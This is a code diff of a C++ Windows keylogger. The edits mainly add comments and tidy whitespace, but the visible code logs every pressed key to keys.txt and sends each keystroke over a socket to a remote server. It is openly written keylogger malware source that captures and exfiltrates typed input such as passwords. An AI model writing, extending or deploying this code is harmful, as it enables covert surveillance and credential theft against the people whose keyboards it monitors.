@@ -16,7 +16,10 @@ void connectToServer(struct sockaddr_in *serv_addr, SOCKET, const char* server_i
 void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
 
+
 int main(){
+
+    //create a file to log the keystrokes
     ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     
     SOCKET client_socket;
@@ -33,7 +36,11 @@ int main(){
 }
 
 void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip){
+
+    // connect this client code to the server via socket
     connectToServer(serv_addr, client_socket, server_ip);
+
+    // constantly loop through all the characters and check if they are currently being pressed or not
     char c;
     while(true){
         for (c = 0; c < 255; c++){
@@ -87,14 +94,13 @@ void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const cha
                         text = str;
                         keys << c;   
                         sendMsg(client_socket, text);
-                }
-                
+                } 
             }
         }
     }
 }
 
-    
+// function to initialize Winsock so that we can use sockets
 void startWinsock(WSADATA *wsaData) {
     if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
         std::cout << "WSAStartup failed\n";
@@ -102,6 +108,7 @@ void startWinsock(WSADATA *wsaData) {
     }
 }
 
+// function to start the socket and handles errors
 SOCKET startSocket(){
     SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (clientSocket == INVALID_SOCKET) {
@@ -114,7 +121,7 @@ SOCKET startSocket(){
 }
 
 
-    //connection to server
+// function to connect this client to the server via socket
 void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
     if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
         printf("\nInvalid address/ Address not supported \n");
@@ -131,9 +138,8 @@ void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const 
     }
 }
 
+// function to send message via socket connection
 void sendMsg(SOCKET client_socket, const char *msg) {
-    //printf("Sending hello message to the server... ");
-    //const char* msg = "Hello from my cpp client!";
     int sent = send(client_socket, msg, strlen(msg), 0);
     if(sent == SOCKET_ERROR){
         std::cout << "Server send error: " << WSAGetLastError() << std::endl;
@@ -142,6 +148,7 @@ void sendMsg(SOCKET client_socket, const char *msg) {
     }
 }
 
+// function to close the socket and clean up the resources that are no longer being used
 void closeSocket(SOCKET client_socket){
     closesocket(client_socket);
     WSACleanup();
